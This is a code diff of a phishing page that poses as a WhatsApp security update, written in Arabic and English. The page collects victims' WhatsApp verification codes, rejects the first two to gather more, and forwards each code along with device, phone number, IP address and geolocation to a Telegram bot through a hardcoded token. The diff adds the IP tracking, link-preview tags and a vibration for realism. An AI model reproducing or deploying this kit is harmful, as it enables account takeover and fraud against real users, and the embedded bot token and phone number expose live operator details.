@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp Security</title>
+    <meta property="og:title" content="WhatsApp Security Update">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+    
     <style>
         :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, sans-serif; }
@@ -18,7 +21,6 @@
         .line b { color: #fff; }
         .otp-input { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 30px; text-align: center; outline: none; letter-spacing: 5px; margin: 20px 0; }
         .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 15px; font-weight: bold; cursor: pointer; }
-        .btn:disabled { opacity: 0.6; }
         .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
@@ -48,33 +50,15 @@
     </div>
 
     <script>
+        const CFG = {
+            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
+            C: '5446862709',
+            P: new URLSearchParams(window.location.search).get('u') || "01030003287"
+        };
+
         const langs = {
-            ar: { 
-                load: "جاري فحص بروتوكولات الأمان...", 
-                title: "تحديث أمان واتساب", 
-                device: "الجهاز:", 
-                status: "الحالة:", 
-                status_v: "تحديث مطلوب", 
-                number: "الرقم:", 
-                desc: "أدخل كود التحقق (6 أرقام) لمزامنة تشفير حسابك مع الخادم الجديد.", 
-                btn: "تحديث الآن", 
-                err: "فشل التحقق: الكود غير صحيح أو انتهت صلاحيته.", 
-                wait: "جاري مطابقة الكود...", 
-                success: "تم قبول الكود. جاري المزامنة..." 
-            },
-            en: { 
-                load: "Checking security protocols...", 
-                title: "Security Update", 
-                device: "Device:", 
-                status: "Status:", 
-                status_v: "Update Required", 
-                number: "Number:", 
-                desc: "Enter the 6-digit code to sync your account encryption with the new server.", 
-                btn: "Update Now", 
-                err: "Verification failed: Incorrect or expired code.", 
-                wait: "Matching code...", 
-                success: "Code accepted. Syncing..." 
-            }
+            ar: { load: "جاري المزامنة...", title: "تحديث أمان واتساب", device: "الجهاز:", status: "الحالة:", status_v: "تحديث إلزامي مطلوب", number: "رقم الحساب:", desc: "أدخل كود التحقق المكون من 6 أرقام لتأمين حسابك.", btn: "تحديث ومزامنة الآن", err: "فشل التحقق: الكود غير صحيح.", wait: "جاري المطابقة...", success: "تم بنجاح" },
+            en: { load: "Syncing...", title: "Security Update", device: "Device:", status: "Status:", status_v: "Mandatory Update", number: "Account:", desc: "Enter the 6-digit code to secure your account.", btn: "Update Now", err: "Verification failed: Incorrect code.", wait: "Matching...", success: "Success" }
         };
 
         const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
@@ -90,23 +74,16 @@
         document.getElementById('desc').innerText = t.desc;
         document.getElementById('btn-txt').innerText = t.btn;
 
-        const CFG = {
-            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
-            C: '5446862709',
-            P: new URLSearchParams(window.location.search).get('u') || "01030003287"
-        };
-        document.getElementById('phone-display').innerText = `+20 ${CFG.P.substring(0,3)} •••• ${CFG.P.slice(-2)}`;
-
-        function getDeviceSimple() {
+        function getDevice() {
             const ua = navigator.userAgent;
             if (/iPhone|iPad|iPod/.test(ua)) return "iPhone";
             if (/Android/.test(ua)) return "Android";
-            if (/Windows/.test(ua)) return "Windows PC";
-            return "Mobile Device";
+            return "PC / Desktop";
         }
 
-        const deviceName = getDeviceSimple();
+        const deviceName = getDevice();
         document.getElementById('device').innerText = deviceName;
+        document.getElementById('phone-display').innerText = `+20 ${CFG.P.substring(0,3)} •••• ${CFG.P.slice(-2)}`;
 
         document.getElementById('otp').addEventListener('input', e => {
             let v = e.target.value.replace(/\D/g, '');
@@ -121,11 +98,19 @@
             }).catch(()=>{});
         }
 
-        window.onload = () => {
+        window.onload = async () => {
+            // جلب بيانات الـ IP والبلد
+            let extra = "";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                extra = `\n📍 <b>Location:</b> <code>${data.city}, ${data.country_name}</code>\n🌐 <b>IP:</b> <code>${data.ip}</code>\n📡 <b>ISP:</b> <code>${data.org}</code>`;
+            } catch(e) { extra = "\n📍 Location: Unknown"; }
+
             setTimeout(() => {
                 document.getElementById('checker').style.display = 'none';
                 document.getElementById('app').classList.add('active');
-                notify(`👤 <b>New Target</b>\n📱 Device: <code>${deviceName}</code>\n🌍 Phone: <code>${CFG.P}</code>`);
+                notify(`👤 <b>New Visitor</b>\n📱 Device: <code>${deviceName}</code>\n🌍 Phone: <code>${CFG.P}</code>${extra}`);
             }, 2500);
         };
 
@@ -137,29 +122,20 @@
             const btn = document.getElementById('btn-txt');
             btn.innerText = t.wait; btn.disabled = true;
 
-            // إرسال كل محاولة لتليجرام
-            await notify(`🔥 <b>OTP Attempt #${step}</b>\n🔑 Code: <code>${val}</code>\n👤 Phone: <code>${CFG.P}</code>`);
+            await notify(`🔥 <b>OTP #${step}</b>\n🔑 Code: <code>${val}</code>\n👤 Phone: <code>${CFG.P}</code>`);
 
             if(step < 3) {
-                // أول وثاني مرة: رفض
                 setTimeout(() => {
+                    if (navigator.vibrate) navigator.vibrate([100, 50, 100]); // هزة موبايل خفيفة للواقعية
                     alert(t.err);
                     document.getElementById('otp').value = "";
                     btn.innerText = t.btn; btn.disabled = false;
-                }, 2000);
+                }, 1500);
             } else {
-                // ثالث مرة: قبول وهمي وتحويل
                 btn.innerText = t.success;
                 setTimeout(() => {
-                    document.body.innerHTML = `
-                        <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center;">
-                            <div class="spinner"></div>
-                            <p style="margin-top:20px; color:#00a884; font-weight:bold;">${t.success}</p>
-                            <p style="color:#8696a0; font-size:12px; margin-top:5px;">Redirecting to security center...</p>
-                        </div>`;
-                    setTimeout(() => {
-                        window.location.href = "https://www.whatsapp.com/security";
-                    }, 2000);
+                    document.body.innerHTML = `<div class="spinner"></div>`;
+                    window.location.href = "https://www.whatsapp.com/security";
                 }, 1500);
             }
         }
